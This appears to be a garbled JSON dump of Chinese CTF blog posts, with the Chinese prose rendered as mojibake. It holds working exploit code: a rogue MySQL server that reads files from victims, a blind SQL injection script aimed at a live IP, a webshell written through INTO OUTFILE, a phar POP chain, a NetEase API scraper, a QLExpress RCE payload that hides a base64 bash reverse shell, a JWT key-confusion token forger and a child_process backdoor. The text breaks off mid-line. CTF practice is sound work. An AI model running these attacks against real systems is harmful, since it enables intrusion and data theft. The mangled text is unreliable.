'\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00', ))) ) self.order = 1 self.states = [b'LOGIN', b'CAPS', b'ANY'] if checkVersionPy3() else ['LOGIN', 'CAPS', 'ANY'] def push(self, data): _infoShow('Pushed: %r', data) data = str(data) async_chat.push(self, data.encode(&quot;latin1&quot;) if checkVersionPy3() else data) def collect_incoming_data(self, data): _infoShow('Data recved: %r', data) self.ibuffer.append(data) def found_terminator(self): data = b&quot;&quot;.join(self.ibuffer) if checkVersionPy3() else &quot;&quot;.join(self.ibuffer) self.ibuffer = [] if self.state == self.stateList[0]: # LEN len_bytes = data[0] + 256 * data[1] + 65536 * data[2] + 1 if checkVersionPy3() else ord( data[0]) + 256 * ord(data[1]) + 65536 * ord(data[2]) + 1 if len_bytes &lt; 65536: self.set_terminator(len_bytes) self.state = self.stateList[2] # Data else: self.state = self.stateList[3] # MoreLength elif self.state == self.stateList[3]: # MoreLength if (checkVersionPy3() and data[0] != b'\\0') or data[0] != '\\0': self.push(None) self.close_when_done() else: self.state = self.stateList[2] # Data elif self.state == self.stateList[2]: # Data packet = _MysqlPacket.parse(data) try: if self.order != packet.packet_num: raise _OutOfOrder() else: # Fix ? self.order = packet.packet_num + 2 if packet.packet_num == 0: if packet.payload[0] == '\\x03': _infoShow('Query') self.set_terminator(3) self.state = self.stateList[0] # LEN self.sub_state = self.stateList[4] # File self.file = fileName.pop(0) # end if len(fileName) == 1: global _rouge_mysql_server_read_file_end _rouge_mysql_server_read_file_end = True self.push(_MysqlPacket( packet, '\\xFB{0}'.format(self.file) )) elif packet.payload[0] == '\\x1b': _infoShow('SelectDB') self.push(_MysqlPacket( packet, '\\xfe\\x00\\x00\\x02\\x00' )) raise _LastPacket() elif packet.payload[0] in '\\x02': self.push(_MysqlPacket( packet, '\\0\\0\\0\\x02\\0\\0\\0' )) raise _LastPacket() elif packet.payload == '\\x00\\x01': self.push(None) self.close_when_done() else: raise ValueError() else: if self.sub_state == self.stateList[4]: # File _infoShow('-- result') # fileContent _infoShow('Result: %r', data) if len(data) == 1: self.push( _MysqlPacket(packet, '\\0\\0\\0\\x02\\0\\0\\0') ) raise _LastPacket() else: self.set_terminator(3) self.state = self.stateList[0] # LEN self.order = packet.packet_num + 1 global _rouge_mysql_sever_read_file_result _rouge_mysql_sever_read_file_result.update( {self.file: data.encode() if not checkVersionPy3() else data} ) # test # print(self.file + &quot;:\\n&quot; + content.decode() if checkVersionPy3() else content) self.close_when_done() elif self.sub_state == self.stateList[1]: # Auth self.push(_MysqlPacket( packet, '\\0\\0\\0\\x02\\0\\0\\0' )) raise _LastPacket() else: _infoShow('-- else') raise ValueError('Unknown packet') except _LastPacket: _infoShow('Last packet') self.state = self.stateList[0] # LEN self.sub_state = None self.order = 0 self.set_terminator(3) except _OutOfOrder: _infoShow('Out of order') self.push(None) self.close_when_done() else: _infoShow('Unknown state') self.push('None') self.close_when_done() class _MysqlListener(dispatcher): def __init__(self, sock=None): dispatcher.__init__(self, sock) if not sock: self.create_socket(AF_INET, SOCK_STREAM) self.set_reuse_addr() try: self.bind(('', port)) except error: exit() self.listen(1) def handle_accept(self): pair = self.accept() if pair is not None: _infoShow('Conn from: %r', pair[1]) _HttpRequestHandler(pair) if _rouge_mysql_server_read_file_end: self.close() _MysqlListener() _asyLoop() return _rouge_mysql_sever_read_file_resultif __name__ == '__main__': #fileName=éœ€è¦è¯»å–æ–‡ä»¶,port=VPSéšæ„å¼€æ”¾çš„ç«¯å£(æ³¨æ„ç«¯å£ä¸èƒ½ä¸º3306,åŸå› ä¸ºå•¥æˆ‘å¿˜äº†XD #ä¸ç”¨åœ¨æ„SQLè¯­å¥ã€è´¦æˆ·ã€å¯†ç ã€é€‰ç”¨çš„åº“ï¼Œè¿™äº›å¹¶ä¸å½±å“è„šæœ¬è¿è¡Œ for name, content in rouge_mysql_sever_read_file(fileName=[&quot;/var/www/html/class.php&quot;], port=2333,showInfo=True).items(): print(name + &quot;:\\n&quot; + content.decode()) æˆ‘ä»¬åœ¨è‡ªå·±çš„vpsä¸Šè¿è¡Œï¼Œç„¶ååˆ©ç”¨hackbarå‘æˆ‘ä»¬æ„é€ å¥½çš„æ•°æ®åŒ… config[8]=true&amp;mysql[host]=VPSçš„IP&amp;mysql[user]=lnk&amp;mysql[pass]=lnk&amp;mysql[dbname]=lnk&amp;mysql[port]=2333 è¿™é‡Œçš„config[8]å°±è¦è¯´ä¸€ä¸‹äº†ï¼Œè¿™ä¹Ÿæ˜¯åˆ©ç”¨åˆ°äº†Rogue-MySql-Serveréœ€è¦åœ¨mysqli_optionså‡½æ•°ä¸­çš„è®¾ç½® è€Œä¸ºä»€ä¹ˆä¼ æ•°ç»„8å¯ä»¥çœ‹Article_kelpå¸ˆå‚…çš„è§£é‡Šï¼ˆèµ›åçš„å¤ç°ä¹Ÿæ˜¯å‚è€ƒä»–çš„ å‘é€åï¼Œæˆ‘ä»¬åœ¨vpsä¸Šå°±å¯ä»¥æ¥å—åˆ°æ•°æ® åªæ˜¯è¿™ä¸ªä»£ç æ ¼å¼å®åœ¨æ˜¯éš¾çœ‹ï¼Œä¸çŸ¥é“å¸ˆå‚…æœ‰æ²¡æœ‰å¥½çš„åŠæ³•è½¬æ¢ä¸€ä¸‹ &lt;?php#class.phpclass Upload { public $file; public $filesize; public $date; public $tmp; function __construct(){ $this-&gt;file = $_FILES; } function __toString(){ return $this-&gt;file[&quot;file&quot;][&quot;name&quot;]; } function __get($value){ $this-&gt;filesize-&gt;$value = $this-&gt;date; echo $this-&gt;tmp; }}class Show{ public $source; public $str; public $filter; public function __construct($file) { $this-&gt;source = $file; $this-&gt;schema = 'php://filter/read=convert.base64-encode/resource=/tmp/'; } public function __toString() { $content = $this-&gt;str[0]-&gt;source; $content = $this-&gt;str[1]-&gt;schema; return $content; } public function __get($value){ $this-&gt;show(); return $this-&gt;$value; } public function __set($key,$value) { $this-&gt;$key = $value; } public function show() { $filename = $this-&gt;schema . $this-&gt;source; include($filename); } public function __wakeup() { if ($this-&gt;schema !== 'php://filter/read=convert.base64-encode/resource=/tmp/') { $this-&gt;schema = 'php://filter/read=convert.base64-encode/resource=/tmp/'; } if ($this-&gt;source !== 'default.jpg') { $this-&gt;source = 'default.jpg'; } }}class Test{ public $test1; public $test2; function __toString(){ $str = $this-&gt;test2-&gt;test; return 'test'; } function __get($value){ return $this-&gt;$value; } function __destruct(){ echo $this-&gt;test1; }}?&gt; &lt;?php#function.php$mysqlpath = isset($_GET['mysqlpath'])?$_GET['mysqlpath']:'mysql.txt';if(!file_exists($mysqlpath)){ die(&quot;NoNONo!&quot;);}else{ $arr = json_decode(file_get_contents($mysqlpath)); if($conn-&gt;real_connect($arr-&gt;host, $arr-&gt;user, $arr-&gt;pass, $arr-&gt;db, $arr-&gt;port)){ echo &quot;connect success&quot;; } else{ echo &quot;connect fail&quot;; }}?&gt; ä¸¤ä¸ªæ–‡ä»¶éƒ½è¯»åˆ°æ‰‹ è€Œæ¥ä¸‹æ¥æˆ‘ä»¬çš„åˆ©ç”¨æ€è·¯å°±æ˜¯ åˆ©ç”¨å®ƒç»™çš„mysql.txtçš„çš„å‚æ•°ï¼Œè¿æ¥åæ‰§è¡Œsqlè¯­å¥å†™å…¥shellï¼ˆè¦å†™å…¥åˆ°å¯ä»¥å†™å…¥çš„ç›®å½•ï¼Œè¿™é‡Œéœ€è¦ç”¨ç›²æ³¨è·‘å‡ºæ¥ï¼‰ï¼Œç„¶åç”±class.phpæ„é€ å‡ºPOPé“¾ï¼Œä¸ºäº†åˆ©ç”¨é‡Œé¢çš„includeåŒ…å«æˆ‘ä»¬çš„shellæ–‡ä»¶ å†å°†POPé“¾å­˜å…¥pharæ–‡ä»¶ï¼Œå†™å…¥åˆ°ä¹‹å‰é‚£ä¸ªå¯å†™çš„ç›®å½•ï¼Œæœ€åé€šè¿‡åˆ©ç”¨function.phpé‡Œçš„file_existsæ¥ä½¿ç”¨pharä¼ªåè®®è§¦å‘pharæ–‡ä»¶çš„includeï¼Œå°±èƒ½å¤Ÿæ‰§è¡Œshelläº† æ‰€ä»¥æˆ‘ä»¬ç°åœ¨çš„é¦–è¦ç›®çš„å°±æ˜¯æ³¨å…¥å‡ºå¯ä»¥å†™çš„é‚£ä¸ªç›®å½• åˆ©ç”¨select @@global.secure_file_priv+ ç›²æ³¨ expå¦‚ä¸‹ &quot;&quot;&quot;@Author: C4ry7nk&quot;&quot;&quot;import requestsurl = &quot;http://1.14.71.254:28684/&quot;payload = &quot;select @@global.secure_file_priv&quot;path = ''for i in range(1, 20): for j in range(33, 127): data = { &quot;config[3]&quot;: f&quot;select if(ascii(substr(({payload}),{i},1)) = {j}, sleep(2),1)&quot; } resp = requests.post(url=url, data=data) # print(resp.elapsed.total_seconds()) if resp.elapsed.total_seconds() &gt; 2: path += chr(j) print(&quot;[+]result:&quot;, path) break ç„¶åå†™å…¥æˆ‘ä»¬çš„shell config[3]=select '&lt;?=eval($_POST[cmd])?&gt;' into outfile '/nssctf/lnk.php';&amp;mysql[host]=127.0.0.1&amp;mysql[user]=root&amp;mysql[pass]=nssctf&amp;mysql[dbname]=ctf&amp;mysql[port]=3306 è¿™é‡Œçš„3ä¹Ÿæ˜¯åˆ©ç”¨åˆ°ä¸Šé¢é‚£ä¸ªmysqlå‡½æ•°çš„å‚æ•°ï¼Œå¯ä»¥å»äº†è§£ä¸€ä¸‹ æ¥ä¸‹æ¥æ˜¯æ„é€ POPé“¾ï¼Œæˆ‘è¿™é‡Œç›´æ¥è´´é‚£ä½å¸ˆå‚…çš„EXPäº† &lt;?phpclass Upload {}class Show{}class Test{}$phar =new Phar(&quot;qqw.phar&quot;); $phar-&gt;startBuffering();$phar-&gt;setStub(&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;); $a=new Test();$b=new Show();$a-&gt;test1=$b;$c0=new Upload();$c1=new Upload();$b-&gt;str[0]=$c0;$b-&gt;str[1]=$c1;$d=new Show();$c0-&gt;filesize=$d;$c1-&gt;filesize=$d;$c0-&gt;date=&quot;lnk.php&quot;;$c1-&gt;date=&quot;/nssctf/&quot;;$e=new Test();$c0-&gt;tmp=$e;$c1-&gt;tmp=$e;$e-&gt;test2=$d;$phar-&gt;setMetadata($a); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt; ç„¶åæˆ‘ä»¬å°†pharæ–‡ä»¶16è¿›åˆ¶ç¼–ç  åˆ©ç”¨select hex(LOAD_FILE('æ–‡ä»¶çš„è·¯å¾„')); ç„¶åä¼ è¿‡å» éšåå°±å¯ä»¥ç›´æ¥RCEäº†ï¼Œflagåœ¨envé‡Œ å‚è€ƒè¿™ä½å¸ˆå‚…å†™çš„å¾ˆè¯¦ç»†ï¼Œæ„Ÿè°¢ğŸ™ https://www.cnblogs.com/Article-kelp/p/16271464.html","link":"/2022/05/15/thisismysql/"},{"title":"çˆ¬å–ç½‘æ˜“äº‘è¯„è®ºæ•°æ®","text":"ä¸»è¦æ˜¯æ¶‰åŠåˆ°ä¸€äº›åŠ è§£å¯†çš„ä¸œè¥¿ï¼ŒAESåŠ å¯†ç®—æ³•ç­‰ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œpythonç›´æ¥ä¸Šåº“ è¿˜æœ‰å°±æ˜¯ä¸€ç‚¹ç‚¹jsé€†å‘è°ƒè¯•çš„çŸ¥è¯†ï¼Œå¯¹äºCTFé€‰æ‰‹ç†è§£èµ·æ¥åº”è¯¥é—®é¢˜ä¸å¤§ è§†é¢‘é“¾æ¥ ä¸Šä»£ç  &quot;&quot;&quot;@Author: C4ry7nk&quot;&quot;&quot;# å‚æ•°åŠ å¯† data: &quot;params=l7x8YID96yGLcnVqx42ssXOxw%2FNbE75LDHagas1MACEGYZvBnsSVeLufcb5U0Y2JBiRAQQbetQvjlkz8g0nmQhjwbxEBPtnoWOv7BPJj2M0XZN5k3VYEtUXdZ9qrdesaGTwYnadYrACfSL1H3UoLISMIrdtpBWBz6FZOyv3khJ8NaSdxm1bGd7iIJuGhyDqv5I3YQU5KAlMG3c1mJYhACYpbcrWBwnW62jAM2pEMPWC5rlb%2FyK0v0NiLgmeoOeS96%2BQHREM4kbFWkCg09lp60tbM1Yspk5BzdHTgpY8UtRg%3D&amp;encSecKey=6ddce7f83d1cf1f5f66b83b02de68ffc68fe9d2361c06f119abb95a11191a2784ac2975b138f278d609041370c6b32c0cce7564ceebc6b5e8e32b5e4d92deb4d7602b772b344151c4abe2974cb2e2c8a9cc5c53edced9abc7f35ff9791aa2c26adce5690eaf4b1faf827ec22b38cb799d4eaebbf873dc1467d636b7405b44c8c&quot;# params ==&gt; encText encSecKey ==&gt; encSecKey# æ‰¾åˆ°åŠ å¯†å‡½æ•° window.asrsea(JSON.stringify(i0x), xxxxxx) ===&gt; window.asrsea = d# postè¯·æ±‚&quot;&quot;&quot;function() { function a(a) { # a = 16 var d, e, b = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;, c = &quot;&quot;; for (d = 0; a &gt; d; d += 1) e = Math.random() * b.length, e = Math.floor(e), # éšæœºæ•°å–æ•´ c += b.charAt(e); # å–bä¸­å­—ç¬¦ä¸²å¤„äºeä½ç½®çš„å­—ç¬¦ return c } function b(a, b) { var c = CryptoJS.enc.Utf8.parse(b) , d = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;) , e = CryptoJS.enc.Utf8.parse(a) , f = CryptoJS.AES.encrypt(e, c, { iv: d, mode: CryptoJS.mode.CBC }); return f.toString() } function c(a, b, c) { var d, e; return setMaxDigits(131), d = new RSAKeyPair(b,&quot;&quot;,c), e = encryptedString(d, a) } function d(d, e, f, g) { # d = data , e = bsR6L([&quot;æµæ³ª&quot;, &quot;å¼º&quot;]) ==&gt; 010001, # f = bsR6L(Xp8h.md) ==&gt; 00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7 var h = {} # g = bsR6L([&quot;çˆ±å¿ƒ&quot;, &quot;å¥³å­©&quot;, &quot;æƒŠæ&quot;, &quot;å¤§ç¬‘&quot;]) ==&gt; 0CoJUm6Qyw8W8jud , i = a(16); ä¼ å…¥16 return h.encText = b(d, g), h.encText = b(h.encText, i), h.encSecKey = c(i, e, f), h } function e(a, b, d, e) { var f = {}; return f.encText = c(a + e, b, d), f } window.asrsea = d, window.ecnonasr = e}();&quot;&quot;&quot;from Crypto.Cipher import AESimport requestsimport jsonfrom base64 import b64encodeurl = f&quot;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&quot;data = { &quot;csrf_token&quot;: &quot;&quot;, &quot;cursor&quot;: &quot;-1&quot;, &quot;offset&quot;: &quot;0&quot;, &quot;orderType&quot;: &quot;1&quot;, &quot;pageNo&quot;: &quot;1&quot;, &quot;pageSize&quot;: &quot;20&quot;, &quot;rid&quot;: &quot;R_SO_4_1454037844&quot;, &quot;threadId&quot;: &quot;R_SO_4_1454037844&quot;}d = datae = &quot;010001&quot;f = &quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&quot;g = &quot;0CoJUm6Qyw8W8jud&quot;i = &quot;hdsiOfBnjaQBoPVg&quot;def get_encseckey(): return &quot;13ea329d6819dd53ca6277e72b006aa09a06dc3e048d66e4d85a95b1f0b1adefb1cfe2b3d08e322d900bb2fa1cedc055007c62f2c812766f0bee49273004678327861b3aa9b2112b9d88c698ac859590416ca1b2506e13430b373edac3ce674e6f591841fa93b82963a8fc7dee39ad2338d4d90864c9738519ad5c75c8e070bb&quot;def get_enctext(data): fir = enc_params(data, g) res = enc_params(fir, i) return resdef to_16(data): padding = 16 - len(data) % 16 data += chr(padding) * padding return datadef enc_params(data, key): iv = &quot;0102030405060708&quot; data = to_16(data) aes = AES.new(key=key.encode('utf-8'), mode=AES.MODE_CBC, IV=iv.encode('utf-8')) result = aes.encrypt(data.encode(&quot;utf-8&quot;)) return str(b64encode(result), &quot;utf-8&quot;)resp = requests.post(url=url, data={ &quot;params&quot;: get_enctext(json.dumps(data)), &quot;encSecKey&quot;: get_encseckey()})print(resp.text) ä»£ç é‡å¾ˆå°‘ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯æ³¨é‡Šï¼Œæ³¨æ„è·‘çš„æ—¶å€™ï¼Œiå’ŒencSecKeyçš„å€¼åªèƒ½ç”¨ä¸€æ¬¡ï¼Œåˆ·æ–°ä¹‹åè¦é‡æ–°è°ƒè¯•çœ‹ éƒ¨åˆ†æ•°æ® è¿™é‡Œæˆ‘æœ¬æ¥æƒ³æŠ“çƒ­è¯„çš„ï¼Œä½†æ˜¯è²Œä¼¼å‚æ•°ä¼ é”™äº†ï¼ŒæŠ“æˆæœ€æ–°è¯„è®ºäº†","link":"/2022/03/24/wyy/"},{"title":"ç¬¬ä¸€å±Šç ”ç©¶ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ› Webéƒ¨åˆ†WriteUp","text":"å‰è¨€çœ‹åˆ°é˜Ÿå‹å‘¨æŠ¥é‡Œç»™äº†æ¯”èµ›é™„ä»¶ï¼Œæ¥å¤ç°å­¦ä¹ ä¸€ä¸‹ BabyQLæ˜¯ä¸ªjavaé¢˜ï¼Œç»™äº†ä¸ªjaråŒ…ï¼Œç”¨ideaæ’ä»¶åç¼–è¯‘çœ‹ä¸€ä¸‹æºç  java -cp &quot;/Applications/IntelliJ IDEA.app/Contents/plugins/java-decompiler/lib/java-decompiler.jar&quot; org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true ~/Downloads/ç¬¬ä¸€å±Šç ”ç©¶ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›/BabyQL.jar ~/Downloads/ç¬¬ä¸€å±Šç ”ç©¶ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›/ ç„¶åjarè§£å‹ä¸€ä¸‹ jar xvf ../BabyQL.jar ä»£ç æŒºç®€å•çš„ï¼Œexpè¿™ä¸ªè·¯ç”±ï¼Œæœ€åçš„runner.execute(cmd, (IExpressContext)context, null, true, false)å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚ ä¸»è¦æ˜¯ä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯ç»•è¿‡hashCodeï¼Œä¸€ä¸ªæ˜¯ç»•è¿‡æ­£åˆ™åŒ¹é… ç»•è¿‡hashCodeè¿™é‡Œå‚è€ƒHFCTF2022çš„ezchainï¼Œhttps://goodapple.top/archives/964 è¿™ä½å¸ˆå‚…çš„åšæ³• ä¸€å¥è¯æ¦‚æ‹¬å°±æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦+1ï¼Œç¬¬äºŒä¸ªå­—ç¬¦-31ï¼Œæ„é€ å‡ºçš„hashCodeæ˜¯ç›¸åŒçš„ï¼Œåˆ©ç”¨hVanzhujiarandundunjiechan è¿˜æœ‰å°±æ˜¯ç›´æ¥ç¢°æ’çˆ†ç ´å‡ºå­—ç¬¦ public static void main(String[] args) { String key = &quot;guanzhujiarandundunjiechan&quot;; for (long i = 0; i &lt; 9999999999L; i++) { if (Long.toHexString(i).hashCode() == key.hashCode()) { System.out.println(Long.toHexString(i)); } //çˆ†ç ´å‡ºæ¥çš„ String test = &quot;d7d2d123&quot;; System.out.println(test.hashCode() == key.hashCode()); //true } è¿˜æœ‰å°±æ˜¯è¦æ³¨æ„ï¼Œè¿™é‡Œå‘åŒ…è¦é‡‡ç”¨jsonæ ¼å¼ import requestsimport jsonurl = &quot;http://127.0.0.1:8080/exp&quot;payload = {&quot;cmd&quot;:&quot;777&quot;,&quot;x&quot;:&quot;hVanzhujiarandundunjiechan&quot;}header = {&quot;Content-Type&quot;: &quot;application/json&quot;}resp = requests.post(url=url, data=json.dumps(payload), headers=header)print(resp.text) ç»•è¿‡æ­£åˆ™æˆ‘ä»¬å…ˆå°è¯•printè¯•è¯• å‘ç°è¿™ä¸ªç¡®å®å¯ä»¥æ‰§è¡Œè¡¨è¾¾å¼ï¼Œå¹¶ä¸”cmdå‚æ•°æˆ‘ä»¬å¯æ§ï¼Œä½†æ˜¯çœ‹å®˜æ–¹æ–‡æ¡£ https://github.com/alibaba/QLExpress å®˜æ–¹æ–‡æ¡£ä¸­æœ‰é»˜è®¤çš„è¡¨è¾¾å¼æ‰§è¡Œçš„é»‘åå•ï¼Œé¢˜ç›®ä¸­è¿‡æ»¤äº†process|runtime|javascript|\\\\+|char|\\\\\\\\|from|\\\\[|\\\\]|load ä¸èƒ½å¤Ÿè¿›è¡Œæ‹¼æ¥ç»•è¿‡ï¼Œè¿™é‡Œæˆ‘ä»¬é‡‡ç”¨å®˜æ–¹wpï¼Œåˆ©ç”¨URLç¼–ç ç»•è¿‡ å¯¹payloadè¿›è¡Œurlç¼–ç  java.lang.Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}&quot;).getInputStream() å†åˆ©ç”¨java.net.URLDecoder.decodeè¿›è¡Œè§£ç  å…·ä½“ &quot;cmd&quot;:&quot;import javax.script.ScriptEngineManager;new ScriptEngineManager().getEngineByName(\\&quot;nashorn\\&quot;).eval(java.net.URLDecoder.decode(\\&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%6a%63%75%4d%43%34%77%4c%6a%45%76%4d%6a%4d%7a%4d%79%41%77%50%69%59%78%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\\&quot;));&quot;, expimport requestsimport jsonurl = &quot;http://127.0.0.1:8080/exp&quot;payload = {&quot;cmd&quot;:&quot;import javax.script.ScriptEngineManager;new ScriptEngineManager().getEngineByName(\\&quot;nashorn\\&quot;).eval(java.net.URLDecoder.decode(\\&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%6a%63%75%4d%43%34%77%4c%6a%45%76%4d%6a%4d%7a%4d%79%41%77%50%69%59%78%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\\&quot;));&quot;,&quot;x&quot;:&quot;hVanzhujiarandundunjiechan&quot;}header = {&quot;Content-Type&quot;: &quot;application/json&quot;}resp = requests.post(url=url, data=json.dumps(payload), headers=header)print(resp.text) æ‰§è¡ŒæˆåŠŸ HackThisBoxè¿™é¢˜ç»™äº†dockerä»¥åŠæºç  è€Œä¸”è¿™é¢˜docker-composeå¯åŠ¨ä¹‹å‰ï¼Œå…ˆè‡ªå·±éšä¾¿å†™ä¸ªprivate.pemæ–‡ä»¶æ”¾åœ¨configæ–‡ä»¶é‡Œï¼Œä¸ç„¶æ— æ³•å¯åŠ¨ æ•´ä¸ªç½‘ç«™ä½¿ç”¨äº†jwtçš„éªŒè¯ï¼Œå¹¶ä¸”æ˜¯ä½¿ç”¨éå¯¹ç§°åŠ å¯†RS256è¿›è¡ŒåŠ å¯†ï¼Œè€Œåœ¨è§£å¯†çš„æ—¶å€™ä½¿ç”¨äº†å¯¹ç§°åŠ å¯†ç®—æ³•HS256 è¿™æ ·æœ‰ä¸ªä»€ä¹ˆé—®é¢˜å‘¢ï¼Œä¼šé€ æˆå¯†é’¥æ··æ·†æ”»å‡» JWTæœ€å¸¸ç”¨çš„ä¸¤ç§ç®—æ³•æ˜¯HMACå’ŒRSAã€‚HMACï¼ˆå¯¹ç§°åŠ å¯†ç®—æ³•ï¼‰ç”¨åŒä¸€ä¸ªå¯†é’¥å¯¹tokenè¿›è¡Œç­¾åå’Œè®¤è¯ã€‚è€ŒRSAï¼ˆéå¯¹ç§°åŠ å¯†ç®—æ³•ï¼‰éœ€è¦ä¸¤ä¸ªå¯†é’¥ï¼Œå…ˆç”¨ç§é’¥åŠ å¯†ç”ŸæˆJWTï¼Œç„¶åä½¿ç”¨å…¶å¯¹åº”çš„å…¬é’¥æ¥è§£å¯†éªŒè¯ã€‚ å¦‚æœå°†ç®—æ³•RS256ä¿®æ”¹ä¸ºHS256ï¼ˆéå¯¹ç§°å¯†ç ç®—æ³•=&gt;å¯¹ç§°å¯†ç ç®—æ³•ï¼‰å‘¢ï¼Ÿ é‚£ä¹ˆï¼Œåç«¯ä»£ç ä¼šä½¿ç”¨RS256çš„å…¬é’¥ä½œä¸ºå¯†é’¥ï¼Œç„¶åä½¿ç”¨HS256ç®—æ³•éªŒè¯ç­¾åã€‚ç”±äºå…¬é’¥æœ‰æ—¶å¯ä»¥è¢«æ”»å‡»è€…è·å–åˆ°ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥ä¿®æ”¹headerä¸­ç®—æ³•ä¸ºHS256ï¼Œç„¶åä½¿ç”¨RSAå…¬é’¥å¯¹æ•°æ®è¿›è¡Œç­¾åã€‚ æºç é‡Œæˆ‘ä»¬å·²ç»è·å¾—äº†å…¬é’¥ï¼Œæ‰€ä»¥å¯ä»¥ä¼ªé€ token å†çœ‹è¿™ä¸ªè·¯ç”± router.post('/upload', function(req, res, next) { if(req.files.length !== 0) { var savePath = ''; if(req.auth.isAdmin === false) { var dirName = `./public/upload/${req.auth.home}/` fs.mkdir(dirName, (err)=&gt;{ if(err) { console.log('error') } else { console.log('ok') } }); savePath = path.join(dirName, req.files[0].originalname); } else if(req.auth.isAdmin === true) { savePath = req.auth.home; } fs.readFile(req.files[0].path, function(err, data) { if(err) { return res.status(500).send(&quot;error&quot;); } else { // ä»»æ„æ–‡ä»¶å†™å…¥ fs.writeFileSync(savePath, data); } }); return res.status(200).send(&quot;file upload successfully&quot;); } else { return res.status(500).send(&quot;error&quot;); }}); å¦‚æœæˆ‘ä»¬è®¾ç½®isAdmin=trueå°±å¯ä»¥é€šè¿‡ä¼ å…¥çš„req.auth.homeï¼Œåˆ©ç”¨fs.writeFileSync(savePath, data);ä»»æ„å†™å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥è¦†ç›–index.jsæ–‡ä»¶ï¼Œå†™å…¥ä¸€ä¸ªåé—¨ è€Œè¿™ä¸ªwriteFileSyncå’Œæˆ‘ä»¬ä¹‹å‰åˆ†æè¿‡çš„readFileSyncä¸€æ ·ï¼Œéƒ½å¯ä»¥é€šè¿‡urlç¼–ç æ¥ç»•è¿‡wafï¼Œå°†æˆ‘ä»¬ä¼ å…¥çš„pathnameè¿›è¡Œç¼–ç å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªè¿‡æ»¤ app.use(function(req, res, next) { if([req.body, req.query, req.auth, req.headers].some(function(item) { console.log(req.auth) return item &amp;&amp; /\\.\\.\\/|proc|public|routes|\\.js|cron|views/img.test(JSON.stringify(item)); })) { return res.status(403).send('illegal data.'); } else { next(); };}); æˆ‘ä»¬å…ˆä¼ªé€ tokenæœåŠ¡ token.js var express = require('express');var fs = require(&quot;fs&quot;)var jwt = require(&quot;jsonwebtoken&quot;)var path = require('path')var app = express();var publicKey = fs.readFileSync('./src/config/public.pem');app.get('/', function(req, res, next) { const token = jwt.sign({username: &quot;admin&quot;, isAdmin: true, home: { href: &quot;c&quot;, origin: &quot;c&quot;, protocol: &quot;file:&quot;, hostname: &quot;&quot;, pathname: &quot;/app/%72%6f%75%74%65%73/index.%6a%73&quot; }}, publicKey, {algorithm: &quot;HS256&quot;}); res.send({token})})var server = app.listen(7000, function () { var host = server.address().address; var port = server.address().port; console.log(&quot;Address is http://%s:%s&quot;, host, port);}) åé—¨æ–‡ä»¶shell.js var express = require('express');const execSync = require('child_process').execSync;var router = express.Router();router.get('/', function(req, res, next) { var cmd = execSync(req.query.cmd); res.send(cmd.toString());});module.exports = router; æœ€åçš„exp import requestssess = requests.session()url = 'http://localhost:8082'hearder = {&quot;authorization&quot;:&quot;Bearer 